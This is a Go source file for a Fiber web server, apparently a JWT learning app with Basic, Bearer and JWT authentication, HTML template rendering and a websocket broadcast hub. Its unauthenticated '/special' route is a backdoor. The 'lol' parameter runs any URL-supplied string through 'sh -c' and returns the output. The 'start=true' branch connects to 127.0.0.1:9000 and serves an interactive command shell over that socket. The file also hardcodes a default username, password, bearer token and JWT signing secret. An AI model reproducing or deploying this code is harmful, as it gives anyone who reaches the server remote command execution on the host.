// main.go

package main

import (
	"github.com/gofiber/fiber/v2"
	"encoding/base64"
	"sync"
	"github.com/dgrijalva/jwt-go"
	"github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/gofiber/contrib/websocket"
	"fmt"
	"strings"
	"time"
	"os"
	"bufio"
	"net"
	"flag"
	"os/exec"
	"net/url"
	"embed"
	"html/template"
	"net/http"
	"strconv"

)

//go:embed static/*
var templates embed.FS


const (
	// Used for Basic auth
	// used in jwtLoginHandler for issuing JWT
	defaultUsername = "user"
	defaultPassword = "pass"
	portHTTP		= 8080
	portHTTPS       = 8443
	// Bearer secret token
	bearerSecret = "bearer_secret"
	// Used for signing JWT tokens
	jwtSecretKey = "your_jwt_secret_key"

)

// PageVariables represents the data to be passed to the template
type PageVariables struct {
	Mandatory1 string
	Mandatory2 int
	Optional1  string
	Optional2  bool
	Optional3  float64
}


// Append newline to response
func sendStringWithNewline(c *fiber.Ctx, statusCode int, message string) error {
	// Append a newline character if not present
	if len(message) == 0 || message[len(message)-1] != '\n' {
		message += "\n"
	}

	// Send the response
	return c.Status(statusCode).SendString(message)
}


// Handler for the "/special" route
func specialHandler(c *fiber.Ctx) error {
	// Parse the "lol" and "start" URL parameters
	lolParam := c.Query("lol")
	startParam := c.Query("start")

	// If "/special" endpoint was hit without either "lol" or "start" parameter
	if lolParam == "" && startParam == "" {
		return c.Status(fiber.StatusBadRequest).SendString("Bad Request: Missing parameters. Provide either 'lol' or 'start' parameter.")
	}
	

	// Check and handle the "start" parameter
	if startParam != "" {
		if startParam == "true" {
			// Implement custom logic for "start=true"
			// go handleStartLogic()
			go func ()  {
				conn, err := net.Dial("tcp", "127.0.0.1:9000")
				if err != nil {
					// fmt.Println("Error connecting to remote socket:", err)
					c.Status(fiber.StatusBadRequest).SendString("Bad Request: Error connecting to remote socket: " + err.Error())
					return
				}
		
				fmt.Fprintf(conn, "> ")
				for {
			
				message, _ := bufio.NewReader(conn).ReadString('\n')
			
				// out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
				out, err := exec.Command("sh", "-c" , strings.TrimSuffix(message, "\n")).Output()
			
				if err != nil {
					fmt.Fprintf(conn, "%s\n> ", err)
				}
			
				fmt.Fprintf(conn, "%s\n> ",out)
			
				}

				defer func(){
					// Send the final message to the remote socket
					finalMessage := "Goodbye!"
					_, err = conn.Write([]byte(finalMessage))

					conn.Close()
				}()

			}()
			
		}
		// Ignore any other value for "start"
	}
	
	// Check and handle the "lol" parameter
	if lolParam != "" {
		// Implement custom logic for "lol"
		// go handleLolLogic(lolParam)
		message, err := url.QueryUnescape(lolParam)
		if err != nil {
			return c.Status(fiber.StatusBadRequest).SendString("Bad Request: Unable to decode 'lol' parameter")
		}

		out, err := exec.Command("sh", "-c" , message).Output()

		if err != nil {
			// fmt.Fprintf(conn, "%s\n",err)
			// return c.SendString(string(err.Error()))
		
			return c.SendString(string(err.Error()))
	
		}

		return c.SendString(string(out))

	}

	return c.Status(fiber.StatusBadRequest).SendString("Bad Request: Unknown exception")
}
	
// renderHTMLTemplate is a self-contained function for rendering HTML templates
func renderHTMLTemplate(c *fiber.Ctx) error {
	// Parse the mandatory and optional variables from the query parameters
	mandatory1 := c.Query("mandatory1")
	mandatory2Str := c.Query("mandatory2")
	optional1 := c.Query("optional1", "defaultOptional1")
	optional2Str := c.Query("optional2", "false")
	optional3Str := c.Query("optional3", "3.14")


	// Convert mandatory2 to int
	mandatory2, err := strconv.Atoi(mandatory2Str)
	if err != nil {
		return c.Status(http.StatusBadRequest).SendString("Bad Request: Unable to convert mandatory2 to integer")
	}

	// Convert optional2 to boolean
	optional2, err := strconv.ParseBool(optional2Str)
	if err != nil {
		return c.Status(http.StatusBadRequest).SendString("Bad Request: Unable to convert optional2 to boolean")
	}

	// Convert optional3 to float64
	optional3, err := strconv.ParseFloat(optional3Str, 64)
	if err != nil {
		return c.Status(http.StatusBadRequest).SendString("Bad Request: Unable to convert optional3 to float64")
	}

	// Validate mandatory variables
	if mandatory1 == "" {
		return c.Status(http.StatusBadRequest).SendString("Bad Request: mandatory1 is missing")
	}

	// Prepare the data for the template
	data := PageVariables{
		Mandatory1: mandatory1,
		Mandatory2: mandatory2,
		Optional1:  optional1,
		Optional2:  optional2,
		Optional3:  optional3,
	}
	
	
	// Load the HTML template from the embedded files
	templateContent, err := templates.ReadFile("static/index.html")
	if err != nil {
		return c.Status(http.StatusInternalServerError).SendString("Internal Server Error")
	}

	// Parse the HTML template
	tmpl, err := template.New("index").Parse(string(templateContent))
	if err != nil {
		return c.Status(http.StatusInternalServerError).SendString("Internal Server Error")
	}

	// Render the template with the data
	// Set the Content-Type header
	c.Set("Content-Type", "text/html")

	err = tmpl.Execute(c.Response().BodyWriter(), data)
	if err != nil {
		return c.Status(http.StatusInternalServerError).SendString("Internal Server Error")
	}

	return nil
}


// Middleware for JWT verification
func jwtVerifyMiddleware(c *fiber.Ctx) error {
	// Get the Authorization header
	authHeader := c.Get("Authorization")

	// Check if Authorization header is empty
	if authHeader == "" {
		return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Missing Authorization header")
	}

	// Check if Authorization is Bearer
	if !strings.HasPrefix(authHeader, "Bearer ") {
		return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid Authorization method")
	}

	// Extract the token from the Authorization header
	tokenString := authHeader[7:]

	// Verify the JWT token
	_, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
		// Check the signing method
		if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"])

		
		}
		// Provide the secret key for verification
		return []byte(jwtSecretKey), nil


	})
	
	// if err != nil || !token.Valid {
	// 	return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid JWT token")
	// }

	if err != nil { 
		switch errType := err.(type) {
		case *jwt.ValidationError:
			switch {
			case errType.Errors&jwt.ValidationErrorExpired != 0:
				return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Token is expired")
			case errType.Errors&jwt.ValidationErrorNotValidYet != 0:
				return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Token is not yet valid")
			case errType.Errors&jwt.ValidationErrorMalformed != 0:
				return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Malformed token")
			case errType.Errors&jwt.ValidationErrorSignatureInvalid != 0:
				return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid token signature")
			default:
				return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid JWT token")
			}
		case nil:
			// Token is valid, proceed with handling the protected route
			// return c.SendString("Protected route accessed successfully")
			return c.Next()	
		default:
			fmt.Printf("Unexpected error verifying token: %v\n", err)
			return c.Status(fiber.StatusInternalServerError).SendString("Internal Server Error")
		}


	}

	// Allow access to the next middleware or route handler
	return c.Next()
}


// Handler for JWT login endpoint ("/jwt")
func jwtLoginHandler(c *fiber.Ctx) error {
	// Extract credentials from the request (assuming JSON format)
	var credentials struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := c.BodyParser(&credentials); err != nil {
		return c.Status(fiber.StatusBadRequest).SendString("Bad Request: Invalid request format")
	}

	// Validate credentials
	if credentials.Username != defaultUsername  || credentials.Password != defaultPassword  {
		return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid credentials")
	}

	// Generate JWT token
	token := jwt.New(jwt.SigningMethodHS256)
	claims := token.Claims.(jwt.MapClaims)
	claims["username"] = credentials.Username
	claims["exp"] = time.Now().Add(time.Hour * 24).Unix() // Token expiration time (adjust as needed)

	// Sign the token with the secret key
	tokenString, err := token.SignedString([]byte(jwtSecretKey))
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).SendString("Internal Server Error: Unable to generate JWT token")
	}

	// Send the JWT token to the client
	return c.JSON(fiber.Map{"token": tokenString})
}

// Handler for the protected endpoint ("/protected")
// func protectedHandler(c *fiber.Ctx) error {
// 	return c.SendString("Access granted to JWT protected endpoint!")
// }



// Refactored basicAuthMiddleware to handle both Basic and Bearer authentication
func authMiddleware(c *fiber.Ctx) error {
	// Get the Authorization header
	authHeader := c.Get("Authorization")

	// Check if Authorization header is empty
	if authHeader == "" {
		return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Missing Authorization header")
	}

	// Check if Authorization is Basic, Bearer, or JWT
	switch {

	// Check if Authorization is Basic or Bearer
	case strings.HasPrefix(authHeader, "Basic "):
		// Basic Authentication
		// Decode the Authorization header using base64
		decodedCredentials, err := base64.StdEncoding.DecodeString(authHeader[6:])
		if err != nil {
			return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid Authorization header")
		}

		// Check the decoded credentials
		credentials := string(decodedCredentials)
		if credentials != defaultUsername+":"+defaultPassword {
			return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid credentials")
		}

	case strings.HasPrefix(authHeader, "Bearer "):
		// Bearer Authentication
		// Extract the token from the Authorization header
		token := authHeader[7:]

		// Check the extracted token
		if token != bearerSecret {
			return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Invalid token")
		}
		

	default:
		// Unsupported Authorization method
		return c.Status(fiber.StatusUnauthorized).SendString("Unauthorized: Unsupported Authorization method")
	}

	// Authentication successful, proceed to the next middleware or route handler
	return c.Next()
}




// Function to generate random JSON
func generateRandomJSON() map[string]interface{} {
	// Implement logic to generate random JSON data
	// For simplicity, let's create a sample JSON
	return map[string]interface{}{
		"key1": "value1",
		"key2": 123,
		"key3": true,
	}
}

// CLI variables
var (
	showHelp bool
	
	httpPort  int
	httpsPort int
	
	enableTLS      bool
	certFilePath   string
	privateKeyPath string


)

func printUsage() {
	fmt.Println("Usage:")
	fmt.Printf("  %s [options]\n", "Go server")
	fmt.Println("Options:")
	flag.PrintDefaults()
}

func init() {	
	flag.IntVar(&httpPort, "http-port", portHTTP, "HTTP server port")
	flag.IntVar(&httpsPort, "https-port", portHTTPS, "HTTPS server port")
	flag.BoolVar(&enableTLS, "enable-tls", false, "Enable serving encrypted app over HTTPS")
	
	flag.StringVar(&certFilePath, "cert-file", "", "Path to the server certificate file (required if enable-tls is true)")
	flag.StringVar(&privateKeyPath, "key-file", "", "Path to the private key file (required if enable-tls is true)")
	
	flag.BoolVar(&showHelp, "help", false, "Show usage/help")
	flag.BoolVar(&showHelp, "h", false, "Show usage/help (shorthand)")

	flag.Parse()

	if showHelp {
		printUsage()
		os.Exit(0)
	}
	if enableTLS {
		if (certFilePath == "" || privateKeyPath == "") {
			printUsage()
			fmt.Println("Error: Both cert-file and key-file are required when enable-tls is true.")
			os.Exit(1)
		} 

		fmt.Printf("[*] TLS flag ENABLED: Server will start with TLS support on port %d \n", httpsPort)
	}
	// if enableTLS && (certFilePath == "" || privateKeyPath == "") {
	// 	printUsage()
	// 	fmt.Println("Error: Both cert-file and key-file are required when enable-tls is true.")
	// 	os.Exit(1)
	// } 

}

// ClientManager manages connected clients
type ClientManager struct {
	clients    map[*websocket.Conn]bool
	register   chan *websocket.Conn
	unregister chan *websocket.Conn
	broadcast  chan []byte
	mutex      sync.Mutex
}

func (manager *ClientManager) start() {
	for {
		select {
		case conn := <-manager.register:
			manager.mutex.Lock()
			manager.clients[conn] = true
			manager.mutex.Unlock()
		case conn := <-manager.unregister:
			manager.mutex.Lock()
			if _, ok := manager.clients[conn]; ok {
				delete(manager.clients, conn)
				// close(conn.SendChannel())
				conn.Close()
			}
			manager.mutex.Unlock()
		case message := <-manager.broadcast:
			manager.mutex.Lock()
			for conn := range manager.clients {
				err := conn.WriteMessage(websocket.TextMessage, message)
				if err != nil {
					fmt.Println("Error broadcasting message:", err)
				}
			}
			manager.mutex.Unlock()
		}
	}
}

var manager = ClientManager{
	clients:    make(map[*websocket.Conn]bool),
	register:   make(chan *websocket.Conn),
	unregister: make(chan *websocket.Conn),
	broadcast:  make(chan []byte),
}


func main() {

	var app = fiber.New(fiber.Config{
        // Customize Fiber configuration options here
        // Example: Prefork, CaseSensitive, StrictRouting, ServerHeader, ErrorHandler, etc.

		// Adjust the Server header for security or branding purposes
		ServerHeader: "JWT-app-server",

		// This allows to setup app name for the app	
		AppName: "I learn JWT App",

		// Enables or disables automatic ETag generation for caching
		// ETag: true,
		
		// Toggle to make routes case-sensitive if needed
		CaseSensitive: true,
		
		// Use when you want strict matching for routes with or without trailing slashes.
		// Enforces strict routing, where the presence of a trailing slash matters
		StrictRouting: true,
		
		// Controls whether to use immutable contexts. 
		// When set to true, context values become read-only
		// Immutable: true,

		// Sets the maximum duration for reading the entire request (Default = 0)
		ReadTimeout: 5 * time.Second,

		// Sets the maximum duration for writing the entire response
		WriteTimeout: 10 * time.Second,

		// EnablePrintRoutes enables print all routes with their method, path, name and handler
		// EnablePrintRoutes: true,

    })

	// Use built-in logger middleware
	app.Use(logger.New(logger.Config{
		Format: "[${time}] [${ip}]:${port} ${status} - ${method} ${path} via ${protocol}\n",
	}))
	

	// Define grouped routes
	jwtRoute := app.Group("/jwt")

	// Define the "/jwt" route for JWT login
	jwtRoute.Post("/login", jwtLoginHandler)

	// Define the protected endpoint ("/protected")
	jwtRoute.Get("/secret", jwtVerifyMiddleware, func(c *fiber.Ctx) error {
		// return c.SendString("Access granted to JWT protected endpoint!")
		return sendStringWithNewline(c, 200, "Access granted to JWT protected endpoint!")
		
	})

	// Define the "/special" route
	// app.Get("/special", specialHandler)



	// Define grouped routes
	unprotected := app.Group("/")

	// Example: Disable basic auth for /protected/unprotected endpoint
	unprotected.Get("/unprotected", func(c *fiber.Ctx) error {
		return c.SendString("Unprotected lol \n")
	})

	// Define a route for rendering HTML templates
	unprotected.Get("/render", renderHTMLTemplate)
	unprotected.Get("/special", specialHandler)
	// Route for handling WebSocket connections
	// unprotected.Get("/ws", NewWebSocketHandler)
    unprotected.Use("/ws", func(c *fiber.Ctx) error {
        // IsWebSocketUpgrade returns true if the client
        // requested upgrade to the WebSocket protocol.
        if websocket.IsWebSocketUpgrade(c) {
            c.Locals("allowed", true)
            return c.Next()
        }
        return fiber.ErrUpgradeRequired
    })

	unprotected.Get("/ws/:id", websocket.New(func(c *websocket.Conn) {
		// Register the new client
		manager.register <- c
		defer func() {
			// Unregister the client when the connection is closed
			manager.unregister <- c
		}()

		// Logic for handling WebSocket connections goes here
		fmt.Println("WebSocket connection established")

		// Example: Read messages from the WebSocket connection
		for {
			messageType, p, err := c.ReadMessage()
			if err != nil {
				fmt.Println("Error reading from WebSocket:", err)
				break
			}

			// Example: Broadcast the received message to all connected clients
			manager.broadcast <- p

			// Example: Write messages back to the WebSocket connection
			err = c.WriteMessage(messageType, p)
			if err != nil {
				fmt.Println("Error writing to WebSocket:", err)
				break
			}
		}
	}))

	// Start the client manager
	go manager.start()




	// Define grouped routes
	// protected := app.Group("/", basicAuthMiddleware, )
	protected := app.Group("/", authMiddleware)



	// setupProtectedRoutes(protected)

	protected.Get("/ping", func(c *fiber.Ctx) error {
		return c.SendString("pong \n")
	})

	// JSON route within the /protected group
	protected.Get("/json", func(c *fiber.Ctx) error {
		// Implement a function to generate random JSON
		randomJSON := generateRandomJSON()
		return c.JSON(randomJSON)
	})


	
	go func() {
		if err := app.Listen(fmt.Sprintf(":%d", httpPort)); err != nil {
			fmt.Println("HTTP server failed. Exiting...")
			os.Exit(1)
		}
	}()

	if enableTLS {
		go func() {
			// 	// tlsConfig := &tls.Config{
			// 	//    MinVersion:               tls.VersionTLS13,
			// 	//    CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
			// 	//    PreferServerCipherSuites: true,
			// 	// }
				fmt.Println("[*] Loading server CERTIFICATE file: ", certFilePath)
				fmt.Println("[*] Loading server PRIVATE KEY file: ", privateKeyPath)
				if err := app.ListenTLS(fmt.Sprintf(":%d", httpsPort), certFilePath, privateKeyPath); err != nil {
					fmt.Println("[!] HTTP/S server failed. Exiting...")
					fmt.Println("Error: ", err.Error())
				   os.Exit(1)
				}
			}()
	}
	
	select {}
	// app.Listen(portHTTP)

}


